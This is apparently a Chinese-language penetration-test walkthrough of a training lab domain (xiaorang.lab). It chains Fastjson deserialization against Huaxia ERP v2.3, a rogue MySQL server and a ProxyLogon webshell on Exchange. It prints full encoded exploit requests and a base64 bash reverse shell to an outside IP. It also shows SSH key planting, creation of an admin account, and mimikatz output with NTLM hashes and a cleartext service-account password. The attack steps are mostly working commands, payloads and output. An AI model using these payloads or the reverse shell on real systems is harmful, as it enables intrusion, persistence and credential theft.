
# 外网

```bash
┌──(root㉿MJ)-[/tmp/test]
└─# fscan -h 39.99.131.160

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
39.99.131.160:22 open
39.99.131.160:8000 open
39.99.131.160:80 open
[*] alive ports len is: 3
start vulscan
[*] WebTitle http://39.99.131.160      code:200 len:19813  title:lumia
[*] WebTitle http://39.99.131.160:8000 code:302 len:0      title:None 跳转url: http://39.99.131.160:8000/login.html
[*] WebTitle http://39.99.131.160:8000/login.html code:200 len:5662   title:Lumia ERP
```
是个华夏erp v2.3
[[Java 代码审计之华夏 ERP CMS v2.3 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/347135.html)](https://www.freebuf.com/articles/web/347135.html)

开启`checkAutoType`才能打fastjson反序列化，这里靶子开了，这里还是全编码一下吧，不然打不进去
```text
GET /user/list?search=%7b%22%40%74%79%70%65%22%3a%22%6a%61%76%61%2e%6e%65%74%2e%49%6e%65%74%34%41%64%64%72%65%73%73%22%2c%22%76%61%6c%22%3a%22%67%62%64%6e%67%65%2e%64%6e%73%6c%6f%67%2e%63%6e%22%7d&currentPage=1&pageSize=15 HTTP/1.1
Host: 39.99.131.160:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://39.99.131.160:8000/login.html
Connection: keep-alive
Cookie: JSESSIONID=AA1A093C055CC78E2E5D4AA289F2E0E5; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1789900518; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1789900736; HMACCOUNT=54E1DC9C397D3430
Upgrade-Insecure-Requests: 1
If-Modified-Since: Sun, 23 Oct 2022 11:30:06 GMT
Priority: u=0, i


```

<img width="1928" height="1073" alt="Image" src="https://github.com/user-attachments/assets/b680c16d-fa97-4e7e-98d3-d4f3ab7c4c40" />

接下来弹shell，发现一直没法接到响应

Fastjson的`JdbcRowSetImpl`利用链最终会触发JNDI的`lookup()`请求，从你的服务器加载并执行恶意类。但Oracle在JDK中引入了安全限制：

- **RMI协议**：从 **JDK 8u121** 开始，`com.sun.jndi.rmi.object.trustURLCodebase` 默认值为 `false`，禁止从远程Codebase加载工厂类。
    
- **LDAP协议**：从 **JDK 8u191** 开始，`com.sun.jndi.ldap.object.trustURLCodebase` 也默认变为 `false`。此外，**JDK 8u432**（OpenJDK）/ **8u461**（OracleJDK）之后的版本，进一步限制了LDAP的本地反序列化利用链[](https://www.gm7.org/archives/49610)。
    

你使用的RMI协议（`rmi://211.159.175.21:1099/islsln`）正好触发了第一个限制，因此DNSlog有记录，但JVM拒绝了远程类的加载。


```
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://211.159.175.21:1099/pkpdow",
        "autoCommit":true
    }
}
```
华夏ERP的`pom.xml`中引入了`mysql-connector-java`依赖，其内部类`com.mysql.jdbc.JDBC4Connection`存在反序列化漏洞

有些博客水的很，高质量的还是得自己找
[[华夏erp-v2.3代码审计-先知社区](https://xz.aliyun.com/news/91580)](https://xz.aliyun.com/news/91580)
这里有绕过手法，但是可能checkAutoType并没有开，所以也打不了

所以走mysql JDBC了，只能说没有ai感觉自己就是煞笔了

修改一下config.json文件，然后直接打就行了，这里还得测一下链子，报错会有提示，cc6可以用

```json
root@VM-8-5-ubuntu:~/tools/MySQL_Fake_Server# cat config.json
{
  "config": {
    "ysoserialPath": "./ysoserial-all.jar",
    "javaBinPath": "java",
    "fileOutputDir": "./fileOutput/",
    "displayFileContentOnScreen": true,
    "saveToFile": true
  },
  "fileread": {
    "linux_passwd": "/etc/passwd",
    "linux_hosts": "/etc/hosts"
  },
  "yso": {
    "CommonsCollections6": [
      "CommonsCollections6",
      "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8yMTEuMTU5LjE3NS4yMS8yMzMyIDA+JjE=}|{base64,-d}|{bash,-i}"
    ]
  }
}
```

```bash
root@VM-8-5-ubuntu:~/tools/MySQL_Fake_Server# python3 server.py
/root/tools/MySQL_Fake_Server/server.py:17: DeprecationWarning: "@coroutine" decorator is deprecated since Python 3.8, use "async def" instead
  def accept_server(server_reader, server_writer):
/root/tools/MySQL_Fake_Server/server.py:21: DeprecationWarning: "@coroutine" decorator is deprecated since Python 3.8, use "async def" instead
  def process_fileread(server_reader, server_writer,filename):
/root/tools/MySQL_Fake_Server/server.py:63: DeprecationWarning: "@coroutine" decorator is deprecated since Python 3.8, use "async def" instead
  def handle_server(server_reader, server_writer):
===========================================
MySQL Fake Server
Author:fnmsd(https://blog.csdn.net/fnmsd)
Load 2 Fileread usernames :[b'linux_passwd', b'linux_hosts']
Load 1 yso usernames :[b'CommonsCollections6']
Load 0 Default Files :[]
Start Server at port 3306
Incoming Connection:('39.99.131.160', 56484)
Login Username:CommonsCollections6
<= 3
Sending Presetting YSO Data with username CommonsCollections6
<= 3
Sending Fake MySQL Server Environment Data
<= 3
Sending Presetting YSO Data with username CommonsCollections6
<= 3
Sending Presetting YSO Data with username CommonsCollections6
<= 3
Sending Presetting YSO Data with username CommonsCollections6
<= 3
Sending Presetting YSO Data with username CommonsCollections6
<= 3
Sending Presetting YSO Data with username CommonsCollections6
<= 3
Sending Presetting YSO Data with username CommonsCollections6
<= 3
Sending Presetting YSO Data with username CommonsCollections6
<= 3
Sending Presetting YSO Data with username CommonsCollections6
<= 3
Sending Presetting YSO Data with username CommonsCollections6
<= 3
Sending Presetting YSO Data with username CommonsCollections6
<= 3
Sending Presetting YSO Data with username CommonsCollections6
<= 3
Sending Presetting YSO Data with username CommonsCollections6
<= 3
Sending Presetting YSO Data with username CommonsCollections6
```

```
GET /user/list?search=%7b%0d%0a%20%20%22%6e%61%6d%65%22%3a%20%7b%0d%0a%20%20%20%20%22%40%74%79%70%65%22%3a%20%22%6a%61%76%61%2e%6c%61%6e%67%2e%41%75%74%6f%43%6c%6f%73%65%61%62%6c%65%22%2c%0d%0a%20%20%20%20%22%40%74%79%70%65%22%3a%20%22%63%6f%6d%2e%6d%79%73%71%6c%2e%6a%64%62%63%2e%4a%44%42%43%34%43%6f%6e%6e%65%63%74%69%6f%6e%22%2c%0d%0a%20%20%20%20%22%68%6f%73%74%54%6f%43%6f%6e%6e%65%63%74%54%6f%22%3a%20%22%32%31%31%2e%31%35%39%2e%31%37%35%2e%32%31%22%2c%0d%0a%20%20%20%20%22%70%6f%72%74%54%6f%43%6f%6e%6e%65%63%74%54%6f%22%3a%20%33%33%30%36%2c%0d%0a%20%20%20%20%22%69%6e%66%6f%22%3a%20%7b%0d%0a%20%20%20%20%20%20%22%75%73%65%72%22%3a%20%22%43%6f%6d%6d%6f%6e%73%43%6f%6c%6c%65%63%74%69%6f%6e%73%36%22%2c%0d%0a%20%20%20%20%20%20%22%70%61%73%73%77%6f%72%64%22%3a%20%22%70%61%73%73%22%2c%0d%0a%20%20%20%20%20%20%22%73%74%61%74%65%6d%65%6e%74%49%6e%74%65%72%63%65%70%74%6f%72%73%22%3a%20%22%63%6f%6d%2e%6d%79%73%71%6c%2e%6a%64%62%63%2e%69%6e%74%65%72%63%65%70%74%6f%72%73%2e%53%65%72%76%65%72%53%74%61%74%75%73%44%69%66%66%49%6e%74%65%72%63%65%70%74%6f%72%22%2c%0d%0a%20%20%20%20%20%20%22%61%75%74%6f%44%65%73%65%72%69%61%6c%69%7a%65%22%3a%20%22%74%72%75%65%22%2c%0d%0a%20%20%20%20%20%20%22%4e%55%4d%5f%48%4f%53%54%53%22%3a%20%22%31%22%0d%0a%20%20%20%20%7d%0d%0a%20%20%7d%0d%0a%7d&currentPage=1&pageSize=15 HTTP/1.1
Host: 39.99.131.160:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:156.0) Gecko/20100101 Firefox/156.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://39.99.131.160:8000/login.html
Connection: keep-alive
Cookie: JSESSIONID=AA1A093C055CC78E2E5D4AA289F2E0E5; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1789900518; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1789900736; HMACCOUNT=54E1DC9C397D3430
Upgrade-Insecure-Requests: 1
If-Modified-Since: Sun, 23 Oct 2022 11:30:06 GMT
Priority: u=0, i


```

直接发包就行

拿到shell写个公钥，连上就行

```bash
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDM4qXRwDvTl9ctJFAuhiWRSobyowSJ6tnlykH6JNAa5rw/7X30dRmROBSdxs68lkvXp7y6xgjHtyfhzNZFtOw22xLBk7fIrt++7jF4h3fnIen/PokDThRJFFPi/rBTADsVrfqCcfhSUBCks2rKoMr4SJKjAwZK3znfKEtKQWhOz7o9zipCMoLatte1TWGmL0OY8f7hJxQpCwmKxK2LFI3lA8eS5pzlQ+4lzdNW3TytxRynKV1LUbkGJ7x/aNrood/UphbqxVVrgx/UXlZRPivit5Ya0ilp/d5uEpdBtGT395uCxKTqSDHQfvalbqbIdGZYq8Ilx+jeKMDFzDZVgACb29DIORYjKEzCIpiLALsTB8MdY2kcrkk6rkkf/Fy+vGkdJ0Q9MzvJ/PRbigKtx/zHiUp+j9j/nBBmPMp5FNzBBeMBlH76DJlDcw8cBTZCVYz1HiqdL4YhXvcoZ7yLj7qa0r7MpFwnobcpMc7mlJLqcf2Pltj4RoLxAu6KLD4ZcfU=' > authorized_keys
```

# 内网

```bash
root@iZ8vbhdtw0jrxiy61cxxupZ:~# ss -lnt
State       Recv-Q Send-Q         Local Address:Port                        Peer Address:Port
LISTEN      0      128                        *:80                                     *:*
LISTEN      0      128                        *:22                                     *:*
LISTEN      0      80                 127.0.0.1:3306                                   *:*
LISTEN      0      128                       :::80                                    :::*
LISTEN      0      100                       :::8000                                  :::*
```
本地开的有mysql，但是扒拉erp的时候发现没什么数据，所以也就没看了，也是还得反编译jar包，太麻烦了

继续fscan

```bash
root@iZ8vbhdtw0jrxiy61cxxupZ:~# fscan -h 172.22.3.12/24

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
(icmp) Target 172.22.3.12     is alive
(icmp) Target 172.22.3.9      is alive
(icmp) Target 172.22.3.26     is alive
(icmp) Target 172.22.3.2      is alive
[*] Icmp alive hosts len is: 4
172.22.3.12:8000 open
172.22.3.9:445 open
172.22.3.2:445 open
172.22.3.26:445 open
172.22.3.26:139 open
172.22.3.2:139 open
172.22.3.9:139 open
172.22.3.9:443 open
172.22.3.26:135 open
172.22.3.2:135 open
172.22.3.9:808 open
172.22.3.9:135 open
172.22.3.9:80 open
172.22.3.9:81 open
172.22.3.12:80 open
172.22.3.12:22 open
172.22.3.2:88 open
172.22.3.9:8172 open
[*] alive ports len is: 18
start vulscan
[*] NetInfo
[*]172.22.3.2
   [->]XIAORANG-WIN16
   [->]172.22.3.2
[*] WebTitle http://172.22.3.12        code:200 len:19813  title:lumia
[*] NetInfo
[*]172.22.3.9
   [->]XIAORANG-EXC01
   [->]172.22.3.9
[*] OsInfo 172.22.3.2   (Windows Server 2016 Datacenter 14393)
[*] NetBios 172.22.3.26     XIAORANG\XIAORANG-PC
[*] NetInfo
[*]172.22.3.26
   [->]XIAORANG-PC
   [->]172.22.3.26
[*] NetBios 172.22.3.2      [+] DC:XIAORANG-WIN16.xiaorang.lab      Windows Server 2016 Datacenter 14393
[*] WebTitle http://172.22.3.12:8000   code:302 len:0      title:None 跳转url: http://172.22.3.12:8000/login.html
[*] NetBios 172.22.3.9      XIAORANG-EXC01.xiaorang.lab         Windows Server 2016 Datacenter 14393
[*] WebTitle http://172.22.3.12:8000/login.html code:200 len:5662   title:Lumia ERP
[*] WebTitle http://172.22.3.9:81      code:403 len:1157   title:403 - 禁止访问: 访问被拒绝。
[*] WebTitle https://172.22.3.9:8172   code:404 len:0      title:None
[*] WebTitle http://172.22.3.9         code:403 len:0      title:None
[*] WebTitle https://172.22.3.9        code:302 len:0      title:None 跳转url: https://172.22.3.9/owa/
[*] WebTitle https://172.22.3.9/owa/auth/logon.aspx?url=https%3a%2f%2f172.22.3.9%2fowa%2f&reason=0 code:200 len:28237  title:Outlook
已完成 18/18
```

| IP              | 主机名              | 域/NetBios      | 操作系统                                 | 开放端口                                  | Web/服务                                         | 角色推断                               |
| --------------- | ---------------- | -------------- | ------------------------------------ | ------------------------------------- | ---------------------------------------------- | ---------------------------------- |
| **172.22.3.2**  | `XIAORANG-WIN16` | `xiaorang.lab` | Windows Server 2016 Datacenter 14393 | 88, 135, 139, 445                     | 无 Web                                          | **域控制器（DC）**，Kerberos 88 + SMB 445 |
| **172.22.3.9**  | `XIAORANG-EXC01` | `xiaorang.lab` | Windows Server 2016 Datacenter 14393 | 80, 81, 135, 139, 443, 445, 808, 8172 | 80→403；81→403；443→302 `/owa/`；OWA 登录页；8172→404 | **Exchange 服务器**（OWA 已暴露）          |
| **172.22.3.26** | `XIAORANG-PC`    | `XIAORANG`     | 未明确，NetBios 显示为 PC                   | 135, 139, 445                         | 无 Web                                          | **域内工作站**                          |

都在域内，打exchange服务 在2016 server上部署的，大概率就是2016，其实也可以nmap扫一下，需要一个存在的邮箱， [administrator@xiaorang.lab](mailto:administrator@xiaorang.lab) 大概率存在
[[p0wershe11/ProxyLogon： ProxyLogon（CVE-2021-26855+CVE-2021-27065） Exchange Server RCE（SSRF->GetWebShell）](https://github.com/p0wershe11/ProxyLogon)](https://github.com/p0wershe11/ProxyLogon)

```bash
┌──(root㉿MJ)-[/tmp/test/CVE-2021-26855+CVE-2021-27065/ProxyLogon]
└─# pc python3 ProxyLogon.py --host=172.22.3.9 --mail=administrator@xiaorang.lab
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
/tmp/test/CVE-2021-26855+CVE-2021-27065/ProxyLogon/ProxyLogon.py:206: SyntaxWarning: invalid escape sequence '\-'
  result = re.search('with SID ([S\-0-9]+) ', r.text)
/tmp/test/CVE-2021-26855+CVE-2021-27065/ProxyLogon/ProxyLogon.py:367: SyntaxWarning: invalid escape sequence '\ '
  | . \ _ _  ___ __   _ _ | |   ___  ___  ___ ._ _

=============================================================

 ___                     _
| . \ _ _  ___ __   _ _ | |   ___  ___  ___ ._ _
|  _/| '_>/ . \ \/| | || |_ / . \/ . |/ . \| ' |
|_|  |_|  \___//\_\`_. ||___|\___/\_. |\___/|_|_|
                   <___'          <___'

                                    author: p0wershe11,RGDZ
=============================================================
[*]:Getting ComputerName and DomainName.
[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.3.9:443  ...  OK
[*]:Domain Name = XIAORANG
[*]:Computer Name = XIAORANG-EXC01.xiaorang.lab
[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.3.9:443  ...  OK
[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.3.9:443  ...  OK
[*]:sid:S-1-5-21-533686307-2117412543-4200729784-500
[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.3.9:443  ...  OK
[!]:Login status code:241
[*]:get ASP.NET_SessionId = 2275d798-919a-458c-8c6d-be388590ecee
[*]:get msExchEcpCanary = x42yBjavSEyvxhxkRkc5zIDsFomcGN8Ij2_KVvAFT6XiD5HuXts3ARVGNUI671GLQZHg_lxxRcw.
[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.3.9:443  ...  OK
[*]:OAB Name = fOAB (Default Web Site)
[*]:OAB ID = 6d8fb74b-8477-43ee-83ba-0b119205e85f
[*]:Setting up webshell payload through OAB
[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.3.9:443  ...  OK
[+]:Setting up webshell payload OK!
[*]:Writing shell...
[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.3.9:443  ...  OK
[*]:Cleaning OAB...
[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.3.9:443  ...  OK
[*]:resp:200
[+]:shell: https://172.22.3.9/aspnet_client/BoAFUyJTtH.aspx
```


```bash
┌──(root㉿MJ)-[/tmp/test/CVE-2021-26855+CVE-2021-27065/ProxyLogon]
└─# pc -q curl -k -X POST "https://172.22.3.9/aspnet_client/BoAFUyJTtH.aspx" \
  --data-urlencode 'command=Response.Write(new ActiveXObject("WScript.Shell").Exec("cmd.exe /c whoami").StdOut.ReadAll())'
nt authority\system
Name                            : OAB (Default Web Site)
PollInterval                    : 480
OfflineAddressBooks             : \榛樿鑴辨満閫氳绨?
RequireSSL                      : True
BasicAuthentication             : False
WindowsAuthentication           : True
OAuthAuthentication             : True
MetabasePath                    : IIS://XIAORANG-EXC01.xiaorang.lab/W3SVC/1/ROOT/OAB
Path                            : C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\OAB
ExtendedProtectionTokenChecking : None
ExtendedProtectionFlags         :
ExtendedProtectionSPNList       :
AdminDisplayVersion             : Version 15.1 (Build 1591.10)
Server                          : XIAORANG-EXC01
InternalUrl                     : https://xiaorang-exc01.xiaorang.lab/OAB
InternalAuthenticationMethods   : OAuth
                                  WindowsIntegrated
ExternalUrl                     : http://f/
ExternalAuthenticationMethods   : OAuth
                                  WindowsIntegrated
AdminDisplayName                :
ExchangeVersion                 : 0.10 (14.0.100.0)
DistinguishedName               : CN=OAB (Default Web Site),CN=HTTP,CN=Protocols,CN=XIAORANG-EXC01,CN=Servers,CN=Exchange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=XIAORANG LAB,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=xiaorang,DC=lab
Identity                        : XIAORANG-EXC01\OAB (Default Web Site)
Guid                            : 6d8fb74b-8477-43ee-83ba-0b119205e85f
ObjectCategory                  : xiaorang.lab/Configuration/Schema/ms-Exch-OAB-Virtual-Directory
ObjectClass                     : top
                                  msExchVirtualDirectory
                                  msExchOABVirtualDirectory
WhenChanged                     : 2026/9/20 19:27:56
WhenCreated                     : 2022/10/23 16:28:41
WhenChangedUTC                  : 2026/9/20 11:27:56
WhenCreatedUTC                  : 2022/10/23 8:28:41
OrganizationId                  :
Id                              : XIAORANG-EXC01\OAB (Default Web Site)
OriginatingServer               : XIAORANG-WIN16.xiaorang.lab
IsValid                         : True
```

直接建一个管理 rdp上去就行

<img width="988" height="754" alt="Image" src="https://github.com/user-attachments/assets/3c511965-fa3a-499a-b632-e27a303c15dc" />

```bash
┌──(root㉿MJ)-[/tmp/test/yunjing]
└─# pc xfreerdp3 /v:172.22.3.9 /u:mj /p:123.com /drive:share,/tmp/test/yunjing/dc
```


域管上来过的，MsCacheV2如果密码弱可以跑出来，一般不大可能，传个mimikatz抓hash

```

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

520	{0;000003e7} 1 D 20898     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
 -> Impersonated !
 * Process Token : {0;00a356b0} 3 F 11435737  	XIAORANG-EXC01\mj	S-1-5-21-804691931-3750513266-524628342-1000	(14g,24p)	Primary
 * Thread Token  : {0;000003e7} 1 D 11566839  	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Impersonation (Delegation)

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 10704560 (00000000:00a356b0)
Session           : RemoteInteractive from 3
User Name         : mj
Domain            : XIAORANG-EXC01
Logon Server      : XIAORANG-EXC01
Logon Time        : 2026/9/20 19:34:14
SID               : S-1-5-21-804691931-3750513266-524628342-1000
	msv :	
	 [00000003] Primary
	 * Username : mj
	 * Domain   : XIAORANG-EXC01
	 * NTLM     : afffeba176210fad4628f0524bfe1942
	 * SHA1     : fa83a92197d9896cb41463b7a917528b4009c650
	tspkg :	
	wdigest :	
	 * Username : mj
	 * Domain   : XIAORANG-EXC01
	 * Password : (null)
	kerberos :	
	 * Username : mj
	 * Domain   : XIAORANG-EXC01
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 2512525 (00000000:0026568d)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2026/9/20 18:36:27
SID               : S-1-5-90-0-2
	msv :	
	 [00000003] Primary
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * NTLM     : 57ea01ab0edb0e8a9f2294600fcbabe9
	 * SHA1     : feae4a77fab8311a447042f595ece89d36d78b6b
	tspkg :	
	wdigest :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : xiaorang.lab
	 * Password : 05 ad 97 1c 32 13 22 ef a2 7b 3c 51 60 99 60 20 03 b8 75 4b 4c d3 79 cd 0d 15 d6 7e 4c 94 ab 75 0d f5 c4 f5 89 35 3a 1a 02 be 89 b4 10 ce 43 3c f7 1a a7 1f a1 35 b4 4f 91 b7 a6 43 ae 2f 39 70 69 92 1b 19 b4 f3 b6 6f 6d 3d 15 0b d4 19 b0 2b 78 96 46 bf 5f 74 ac 61 8e 6d 9c 5b 84 0d 46 07 96 5e 8e 5b e0 2c 82 a5 4d 15 38 e5 16 a0 2f 74 59 dc 6e b2 c9 c4 ac 3b bc 60 d0 a9 17 b8 a4 c3 6b 5f 8f f1 50 75 0b 3f 19 25 30 69 e7 84 4c 5f 99 45 f1 b2 9e af d2 ad 9f d4 9f 69 6a 72 77 e6 04 d7 ac bf 3d e0 99 b8 e5 c9 d0 16 f9 e3 06 53 12 36 1c 1c dc 36 35 be 1c 32 aa 1c 91 dc 67 5f 4a f8 51 61 de a9 12 ea 4b 3c 7f d8 77 23 97 8a d2 fb 5d 91 d9 77 83 ba fe 14 b6 a3 e8 9a 2e 7b 37 b9 72 9a f8 1d ce 7c f1 0e 06 72 f5 c1 4b a0 
	ssp :	
	credman :	

Authentication Id : 0 ; 111883 (00000000:0001b50b)
Session           : Service from 0
User Name         : Zhangtong
Domain            : XIAORANG
Logon Server      : XIAORANG-WIN16
Logon Time        : 2026/9/20 18:34:33
SID               : S-1-5-21-533686307-2117412543-4200729784-1147
	msv :	
	 [00000003] Primary
	 * Username : Zhangtong
	 * Domain   : XIAORANG
	 * NTLM     : 22c7f81993e96ac83ac2f3f1903de8b4
	 * SHA1     : 4d205f752e28b0a13e7a2da2a956d46cb9d9e01e
	 * DPAPI    : ed14c3c4ef895b1d11b04fb4e56bb83b
	tspkg :	
	wdigest :	
	 * Username : Zhangtong
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : Zhangtong
	 * Domain   : XIAORANG.LAB
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 66222 (00000000:000102ae)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2026/9/20 18:34:31
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * NTLM     : 57ea01ab0edb0e8a9f2294600fcbabe9
	 * SHA1     : feae4a77fab8311a447042f595ece89d36d78b6b
	tspkg :	
	wdigest :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : xiaorang.lab
	 * Password : 05 ad 97 1c 32 13 22 ef a2 7b 3c 51 60 99 60 20 03 b8 75 4b 4c d3 79 cd 0d 15 d6 7e 4c 94 ab 75 0d f5 c4 f5 89 35 3a 1a 02 be 89 b4 10 ce 43 3c f7 1a a7 1f a1 35 b4 4f 91 b7 a6 43 ae 2f 39 70 69 92 1b 19 b4 f3 b6 6f 6d 3d 15 0b d4 19 b0 2b 78 96 46 bf 5f 74 ac 61 8e 6d 9c 5b 84 0d 46 07 96 5e 8e 5b e0 2c 82 a5 4d 15 38 e5 16 a0 2f 74 59 dc 6e b2 c9 c4 ac 3b bc 60 d0 a9 17 b8 a4 c3 6b 5f 8f f1 50 75 0b 3f 19 25 30 69 e7 84 4c 5f 99 45 f1 b2 9e af d2 ad 9f d4 9f 69 6a 72 77 e6 04 d7 ac bf 3d e0 99 b8 e5 c9 d0 16 f9 e3 06 53 12 36 1c 1c dc 36 35 be 1c 32 aa 1c 91 dc 67 5f 4a f8 51 61 de a9 12 ea 4b 3c 7f d8 77 23 97 8a d2 fb 5d 91 d9 77 83 ba fe 14 b6 a3 e8 9a 2e 7b 37 b9 72 9a f8 1d ce 7c f1 0e 06 72 f5 c1 4b a0 
	ssp :	
	credman :	

Authentication Id : 0 ; 24167 (00000000:00005e67)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2026/9/20 18:34:15
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * NTLM     : 57ea01ab0edb0e8a9f2294600fcbabe9
	 * SHA1     : feae4a77fab8311a447042f595ece89d36d78b6b
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	 [00000000]
	 * Username : HealthMailbox0d5918ea7298475bbbb7e3602e1e289d@xiaorang.lab
	 * Domain   : (null)
	 * Password : StL6JY;BrHETjE_?|!Bb}Ur_p5|4p>KL#eTb-SMx}?Ft1C_AIW;CI3=?E=4&BQtumhn4-Im].I5QNSQ(nt|N0eb^rsh7$a/fm3u/WCbMx7QDA(xTQ1X5h=KiKj7A*nfY
	 [00000001]
	 * Username : HealthMailbox0d5918ea7298475bbbb7e3602e1e289d@xiaorang.lab
	 * Domain   : (null)
	 * Password : StL6JY;BrHETjE_?|!Bb}Ur_p5|4p>KL#eTb-SMx}?Ft1C_AIW;CI3=?E=4&BQtumhn4-Im].I5QNSQ(nt|N0eb^rsh7$a/fm3u/WCbMx7QDA(xTQ1X5h=KiKj7A*nfY
	credman :	

Authentication Id : 0 ; 10704589 (00000000:00a356cd)
Session           : RemoteInteractive from 3
User Name         : mj
Domain            : XIAORANG-EXC01
Logon Server      : XIAORANG-EXC01
Logon Time        : 2026/9/20 19:34:14
SID               : S-1-5-21-804691931-3750513266-524628342-1000
	msv :	
	 [00000003] Primary
	 * Username : mj
	 * Domain   : XIAORANG-EXC01
	 * NTLM     : afffeba176210fad4628f0524bfe1942
	 * SHA1     : fa83a92197d9896cb41463b7a917528b4009c650
	tspkg :	
	wdigest :	
	 * Username : mj
	 * Domain   : XIAORANG-EXC01
	 * Password : (null)
	kerberos :	
	 * Username : mj
	 * Domain   : XIAORANG-EXC01
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 9023402 (00000000:0089afaa)
Session           : NetworkCleartext from 0
User Name         : HealthMailbox0d5918e
Domain            : XIAORANG
Logon Server      : XIAORANG-WIN16
Logon Time        : 2026/9/20 19:10:36
SID               : S-1-5-21-533686307-2117412543-4200729784-1136
	msv :	
	 [00000003] Primary
	 * Username : HealthMailbox0d5918e
	 * Domain   : XIAORANG
	 * NTLM     : 502317e49505021d7ffb417540f16f99
	 * SHA1     : 12cddca46972b28bd44e47c0a8055d9ada61a173
	 * DPAPI    : e317a7facc3583213273ef4cea7e9ff9
	tspkg :	
	wdigest :	
	 * Username : HealthMailbox0d5918e
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : HealthMailbox0d5918e
	 * Domain   : XIAORANG.LAB
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2026/9/20 18:34:33
SID               : S-1-5-17
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : XIAORANG-EXC01$
Domain            : XIAORANG
Logon Server      : (null)
Logon Time        : 2026/9/20 18:34:15
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : XIAORANG-EXC01$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : xiaorang-exc01$
	 * Domain   : XIAORANG.LAB
	 * Password : (null)
	ssp :	
